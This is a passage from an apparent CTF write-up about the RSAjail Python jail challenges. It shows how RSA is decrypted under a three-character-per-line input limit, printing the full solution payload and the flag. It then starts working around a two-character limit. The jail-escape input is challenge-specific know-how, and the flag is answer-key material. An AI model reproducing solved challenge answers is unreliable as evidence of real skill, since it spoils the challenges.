&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This also works with the walrus operator &lt;code&gt;:=&lt;/code&gt;, which allows you to simultaneously assign and use a value:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; a
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; a
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This allows us to assign variables!&lt;/p&gt;
&lt;p&gt;Using this, we can easily calculate &lt;code&gt;q&lt;/code&gt; and totient(&lt;code&gt;N&lt;/code&gt;).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; q
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; N&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; p
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;91626188501171632213608812997587612695436932752806703465409540571820540906554149309244741450621658939480220966409120116938831715942853207836601892475627420413669286617497654823778323191912299860409614215694474166835113649175038751310702932807349441577883399801632439533079906231771493803222831648878548449211&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; Q
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; q
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; P
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; p
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;91626188501171632213608812997587612695436932752806703465409540571820540906554149309244741450621658939480220966409120116938831715942853207836601892475627420413669286617497654823778323191912299860409614215694474166835113649175038751310702932807349441577883399801632439533079906231771493803222831648878548449210&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;127750039639135452291469296916511977665182772707105105835394106177575972384328835138779199129021442655142693779106301590855325753788389240229980104156282497542563222917610576834540409259922996468593794837650648556603624289477044475006719950179505258557714249124259038486981185420780664515251860649232946903548&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; tn
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; Q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;P
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;11705249213007572990421936617184443719758720950917684036355748809266328313342432732406332612303140287972574727994610020444810735156684731143533051392788629946495317141341719946160252009280014244749469641884684973607977218179289278253741577877160090079277005724555263317605894461607314280682159742910037955412117000975604468533979539203011161347521916591546685760837414004640079221338837551868970422318034227972970869199303925502934739469307563027000999481400011577091796266839247077556279926204231514294027076386121125282895365411259105559248355360129100123018102383167074612615423808066046773408727165254366846797080&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, we encounter a problem when we try to use the &lt;code&gt;pow&lt;/code&gt; function to calculate &lt;code&gt;d&lt;/code&gt;, since its already 3 characters long. But we can simply assign &lt;code&gt;pow&lt;/code&gt; to a one character variable, and call the variable.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; a
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; pow
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; ,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; d
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; a(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; tn)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;built&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; function pow&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11648274153133770164782304077079131643426221263972252582251998502261797151831282755421764809331922475868522797966835166598557555662429845670673643067807328194005395323619089849225312656075559897677203886421950724152235503840836293226002383783093927930638994145964038070824438485086375982384440760381263337901756970407967594318462511066145565417438765220676743701272479157645554216050113790039069731643766975600671592343869927116749284201432788279825917942199764332129526358098814652853585977801662738593891357061660551271798677714748864707921620456793866851137442989843756535782118649227939003435774726697274776300593&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; pow(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10001&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(q&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Doing the same for &lt;code&gt;m = pow(c,d,n)&lt;/code&gt;, we can get the flag.&lt;/p&gt;
&lt;p&gt;Payload:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;654372819&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;654372819&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;text&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;rsajail-3-sol.txt&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-text&#34; &gt;&lt;code&gt;
[
q:=
N//
p,
a:=
pow
,
x:=
p-1
,
y:=
q-1
,
t:=
x*y
,
e:=
2**
16
&amp;#43;1
,
d:=
a(
e,
-1,
t
)
,
m:=
a(
c,
d,
N,
)
,
X(
m
)
]
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Flag:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bwctf{Lmao_pow_function_is_too_powerful...Time_to_ban_it!!!!}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;rsajail-2---20-solves&#34;&gt;RSAjail-2 - 20 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s learn about RSA again!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc rsajail2.chal.perfect.blue 1337&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;The source code is almost the exact same as RSAjail-3, except this time we are restricted to max 2 characters.&lt;/p&gt;

  &lt;img src=&#34;./img/diff.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;This isn&amp;rsquo;t a problem for most of our code, as we can actually make every line 2 characters long, since none of the operators are more than 2 characters.&lt;/p&gt;
&lt;p&gt;Except for the &lt;code&gt;pow&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;As hinted by in the previous flag, we can no longer use &lt;code&gt;pow&lt;/code&gt;, as it is longer than 3 characters.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; [
... po
... w
  File &amp;#34;&amp;lt;stdin&amp;gt;&amp;#34;, line 2
    po
    ^
SyntaxError: invalid syntax. Perhaps you forgot a comma?
&amp;gt;&amp;gt;&amp;gt; [
... po
... w,
  File &amp;#34;&amp;lt;stdin&amp;gt;&amp;#34;, line 2
    po
    ^
SyntaxError: invalid syntax. Perhaps you forgot a comma?
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After thinking for a while, I came to the sad conclusion that we really couldn&amp;rsquo;t use &lt;code&gt;pow&lt;/code&gt; at all.&lt;/p&gt;
&lt;p&gt;Which leaves only one solution - to implement &lt;code&gt;pow&lt;/code&gt; itself.&lt;/p&gt;
&lt;p&gt;There are 2 main components of &lt;code&gt;pow&lt;/code&gt; we need to implement:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Modular inverse - to calculate &lt;code&gt;d&lt;/code&gt;, &lt;code&gt;d = pow(e, -1, tn)&lt;/code&gt;, or $d = e^{-1} \bmod{\varphi(N)}$&lt;/li&gt;
&lt;li&gt;Modular exponentiation - to calculate &lt;code&gt;m&lt;/code&gt;, &lt;code&gt;m = pow(c, d, N)&lt;/code&gt;, or $m = c^d \bmod{N}$&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Each of these have their own algorithms which we must implement.&lt;/p&gt;
&lt;h3 id=&#34;modular-inverse&#34;&gt;Modular Inverse&lt;/h3&gt;
&lt;p&gt;The modular inverse of $e$ modular $\varphi(N)$ is $d$ such that $d \times e = 1 \bmod{\varphi(N)}$, or $d = e^{-1} \bmod{\varphi(N)}$.&lt;/p&gt;
&lt;p&gt;The smallest, &amp;ldquo;simplest&amp;rdquo; implementation of modular inverse I could find was &lt;a href=&#34;https://stackoverflow.com/a/57173975&#34;&gt;this&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;invmod&lt;/span&gt;(e, t):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; invmod(t &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; e, e) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; e
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; res
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, this used recursion, which would be hard, if not impossible, to implement with our current constraints.&lt;/p&gt;
&lt;p&gt;My thought was to find another implementation that used loops instead of recursion, and ChatGPT came up with this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;modular_inverse&lt;/span&gt;(a, m):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Extended Euclidean Algorithm&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    m0, x0, x1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; m, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# q is the quotient&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; m
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Update m and a&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        m, a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; m, m
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Update x0 and x1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        x0, x1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; q &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; x0, x0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Make x1 positive&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        x1 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; m0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The code seems longer and more complex, but for our purposes, its significantly better than recursing. The most tricky part is the &lt;code&gt;while&lt;/code&gt; loop.&lt;/p&gt;
&lt;p&gt;Currently, the method I thought of for having conditionals was by indexing a list with a boolean value:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[false_value, true_value][statement]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;g
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; b:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    a &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;becomes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [a, a&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][a &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; b]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As if &lt;code&gt;a == b&lt;/code&gt; is &lt;code&gt;True&lt;/code&gt;, &lt;code&gt;True == 1&lt;/code&gt;, then &lt;code&gt;a+1&lt;/code&gt; is indexed in the list.&lt;/p&gt;
